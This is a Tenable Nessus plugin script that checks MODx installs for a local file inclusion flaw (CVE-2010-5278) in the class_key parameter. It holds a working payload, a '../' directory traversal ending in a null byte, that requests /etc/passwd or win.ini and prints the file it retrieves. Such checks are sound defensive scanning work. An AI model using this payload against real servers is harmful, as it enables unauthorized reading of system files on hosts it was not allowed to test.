#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if (description)
{
  script_id(56564);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2010-5278");
  script_bugtraq_id(43577);
  script_osvdb_id(68265);

  script_name(english:"MODx < 2.0.3-pl class_key Parameter Local File Inclusion");
  script_summary(english:"Tries to exploit an LFI flaw in MODx");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is affected by a
local file inclusion vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of MODx installed on the remote host fails to sanitize
user-supplied input to the 'class_key' parameter of the
'manager/controllers/default/resource/tvs.php' script before using it
to include PHP code.

Using a specially crafted request, a remote, unauthenticated attacker
may be able to leverage this vulnerability to read arbitrary files or
execute arbitrary PHP code from the affected host, subject to the
privileges under which the web server operates."
  );
   # http://forums.modx.com/thread/226/modx-revolution-2-0-3-out-and-includes-security-fix
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?69226787");
   # http://www.johnleitch.net/Vulnerabilities/MODx.Revolution.2.0.2-pl.Local.File.Inclusion/49
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?abe94853");
  script_set_attribute(attribute:"solution", value:"Upgrade to MODx to 2.0.3 or greater.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"MODx Revolution 2.0.2-pl LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/09/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/10/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:modxcms:modxcms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "modx_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/modx");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'modx', port:port, exit_on_fail:TRUE);
dir = install['dir'];

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/winnt/win.ini', '/windows/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
# look for section tags in win.ini
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]";

traversal = mult_str(str:"../", nb:12) + '..';
url = dir + '/manager/controllers/default/resource/tvs.php';

contents = "";
vuln_reqs = make_array();
found_file = "";

foreach file (files)
{
  exploit = traversal + file + "%00";
  get_url = url + '?class_key=' + exploit;
  res = http_send_recv3(item:get_url, port:port, method:"GET", exit_on_fail:TRUE);

  file_pat = file_pats[file];
  # if the script returns a system file, we are vulnerable
  # if it returns an error - we're unpatched but unable to exploit
  if (
    egrep(pattern:file_pat, string:res[2]) ||
    "function newQuery()" >< res[2] ||
    "failed to open stream: Permission denied" >< res[2] ||
    "failed to open stream: Operation not permitted" >< res[2] ||
    "open_basedir restriction in effect" >< res[2]
  )
  {
    vuln_reqs[url] = build_url(qs:get_url, port:port);
    if(!contents && egrep(pattern:file_pat, string:res[2]))
    {
      found_file = file;
      contents = res[2];
      break;
    }
  }
}

if (!max_index(keys(vuln_reqs)))
  exit(0, "The MODx install at " +  build_url(qs:dir, port:port) + " is not affected.");

if (report_verbosity > 0)
{
  info = "";
  foreach url (keys(vuln_reqs))
    if ((found_file && found_file >< vuln_reqs[url]) || ! found_file)
      info += '\n' +
        crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n'+
        vuln_reqs[url]+'\n'+
        crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';


  if (max_index(keys(vuln_reqs)) > 0) s = "s";
  else s = "";

  if (contents)
  {
    if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

    report = '\n' +
    'Nessus was able to exploit the issue to retrieve the contents of\n' +
    "'" + found_file + "' on the remote host using the following request" + s + ' :\n' +
    info;

  if (report_verbosity > 1)
      report += '\n' +
        'Here are its contents :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        contents +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  else
  {
    report += '\n' +
      'While Nessus was not able to exploit the issue, it was able to verify\n' +
      'the issue exists based on the error message' + s + ' from the following\n' +
      'request' + s +' :\n' +
      '\n' +
      info;
  }

  security_warning(port:port, extra:report);
}
else security_warning(port);
